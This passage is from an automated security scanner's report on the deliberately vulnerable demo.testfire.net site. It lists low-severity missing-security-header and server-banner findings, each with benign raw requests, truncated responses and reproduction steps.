- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ebad2f1e (exactly as issued by the engine) ---
  GET /survey_questions.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:06 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
    
    
    
    
    
    
    
     
        
    
     
    ... [73 more lines, 3998 chars total]
  elapsed_ms: 379.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/survey_questions.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F14] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/status_check.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-adfed9bd (exactly as issued by the engine) ---
  GET /status_check.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:07 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 357.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/status_check.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F15] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/swagger/index.html (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-1c135932 (exactly as issued by the engine) ---
  GET /swagger/index.html
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 1427
    content-type: text/html
    date: Sat, 03 Oct 2026 00:59:08 GMT
    etag: W/"1427-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    <!-- HTML for static distribution bundle build -->
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>Swagger UI</title>
        <link rel="stylesheet" type="text/css" href="./swagger-ui.css" >
        <link rel="icon" type="image/png" href="./favicon-32x32.png" sizes="32x32" />
        <link rel="icon" type="image/png" href="./favicon-16x16.png" sizes="16x16" />
        <style>
          html
          {
    ... [49 more lines, 1426 chars total]
  elapsed_ms: 367.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/swagger/index.html as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F16] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/search.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-fa2998f4 (exactly as issued by the engine) ---
  GET /search.jsp?query=
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 6862
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:09 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 379.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/search.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F17] missing_security_headers — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/doLogin (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f98a1e85 (exactly as issued by the engine) ---
  POST /doLogin
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    uid=&passw=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:23 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  redirect_chain: [[302, 'http://demo.testfire.net/login.jsp']]
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 763.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/doLogin as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F18] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/disclaimer.htm (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cb48b9a0 (exactly as issued by the engine) ---
  GET /disclaimer.htm?url=http%3A%2F%2Fwww.netscape.com
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 2010
    content-type: text/html
    date: Sat, 03 Oct 2026 01:02:11 GMT
    etag: W/"2010-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    <html>
    <head>
      <title>Altoro Mutual: Link Disclaimer</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      <style type="text/css">
      <!--
        p { font: 12px verdana, arial, sans-serif; color:#000000; line-height:1.6 }
      -->
      </style>
      <script>
    
        function go() {
    ... [54 more lines, 2002 chars total]
  elapsed_ms: 373.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/disclaimer.htm as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F19] missing_security_headers — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/sendFeedback (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-4c6d5c19 (exactly as issued by the engine) ---
  POST /sendFeedback
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    cfile=comments.txt&name=&email_addr=&subject=&comments=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-length: 7041
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:02:18 GMT
    server: Apache-Coyote/1.1
  body:
     
    
        
        
    
    
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    ... [69 more lines, 3996 chars total]
  elapsed_ms: 386.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/sendFeedback as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F20] missing_security_headers — low (engine verdict: verified)

- Surface: POST http://demo.testfire.net/doSubscribe (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a28951cf (exactly as issued by the engine) ---
  POST /doSubscribe
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    txtEmail=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 01:03:09 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  redirect_chain: [[302, 'http://demo.testfire.net/index.jsp']]
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 741.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send POST http://demo.testfire.net/doSubscribe as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTFIRE F21] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-609b3a2d (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:36 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 367.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F22] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/style.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-50c19c77 (exactly as issued by the engine) ---
  GET /style.css
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 1165
    content-type: text/css
    date: Sat, 03 Oct 2026 00:58:37 GMT
    etag: W/"1165-1785257390000"
    last-modified: Tue, 28 Jul 2026 16:49:50 GMT
    server: Apache-Coyote/1.1
  body:
    body, table, td, p  {
    	color:#000000;
    	font: 10px Verdana, Arial, Sans-Serif;
    	line-height: 1.6;
    }
    img {
    	border-style: none;
    	border-width: 0px;
    }
    form {
    	margin-top: 0;
    	margin-bottom: 0;
    ... [74 more lines, 1164 chars total]
  elapsed_ms: 374.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/style.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F23] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/index.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d94f2968 (exactly as issued by the engine) ---
  GET /index.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:37 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 371.6
  --- RAW REQUEST req-7d285b44 (exactly as issued by the engine) ---
  GET /index.jsp?content=business.htm
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:40 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3994 chars total]
  elapsed_ms: 377.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/index.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F24] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/login.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-5b436842 (exactly as issued by the engine) ---
  GET /login.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:38 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 375.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/login.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F25] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/feedback.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a40960bd (exactly as issued by the engine) ---
  GET /feedback.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:54 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
        
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    ... [66 more lines, 3999 chars total]
  elapsed_ms: 373.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/feedback.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F26] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/cgi.exe (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-db5dcaca (exactly as issued by the engine) ---
  GET /cgi.exe
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 404
  headers:
    content-length: 6821
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:55 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3997 chars total]
  elapsed_ms: 363.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/cgi.exe as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F27] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/subscribe.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f6527a2b (exactly as issued by the engine) ---
  GET /subscribe.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:56 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 366.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/subscribe.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F28] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/default.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-1c4a4186 (exactly as issued by the engine) ---
  GET /default.jsp?content=security.htm
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 404
  headers:
    content-length: 6821
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:58:57 GMT
    server: Apache-Coyote/1.1
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3997 chars total]
  elapsed_ms: 371.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/default.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F29] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/survey_questions.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ebad2f1e (exactly as issued by the engine) ---
  GET /survey_questions.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:06 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
    
    
    
    
    
    
    
     
        
    
     
    ... [73 more lines, 3998 chars total]
  elapsed_ms: 379.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/survey_questions.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F30] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/status_check.jsp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Apache-Coyote/1.1
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-adfed9bd (exactly as issued by the engine) ---
  GET /status_check.jsp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    content-type: text/html;charset=ISO-8859-1
    date: Sat, 03 Oct 2026 00:59:07 GMT
    server: Apache-Coyote/1.1
    transfer-encoding: chunked
  body:
     
        
    
     
    
    <!-- BEGIN HEADER -->
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" >
    
    
    
    ... [65 more lines, 3998 chars total]
  elapsed_ms: 357.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://demo.testfire.net/status_check.jsp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTFIRE F31] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://demo.testfire.net/swagger/index.html (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
